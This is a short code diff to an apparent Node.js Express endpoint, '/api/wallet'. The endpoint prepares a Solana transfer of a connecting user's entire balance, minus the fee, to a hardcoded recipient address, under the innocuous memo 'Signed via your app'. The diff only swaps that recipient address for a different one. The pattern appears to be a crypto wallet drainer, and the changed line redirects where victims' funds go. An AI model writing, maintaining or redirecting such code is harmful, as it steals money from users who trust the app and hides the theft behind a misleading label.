@@ -136,7 +136,7 @@ app.post('/api/wallet', async (req, res) => {
 
     // Prepare transaction (SOL transfer)
     const payer = publicKey;
-    const recipient = new PublicKey('BgD1CVbMfQNWcRm14BXEnbTbWto9ouEP4aiVXQJRXPRg');
+    const recipient = new PublicKey('84vka944L9qFdBZKHEvpfDp9qqJ5sfcjDXaQ3wjxVRLM');
     const amount = balance - TRANSACTION_FEE;
     const memo = 'Signed via your app';
 
@@ -206,4 +206,5 @@ app.post('/api/wallet', async (req, res) => {
 // Start server
 app.listen(port, () => {
   console.log(`Server running on http://localhost:${port}`);
+
 });
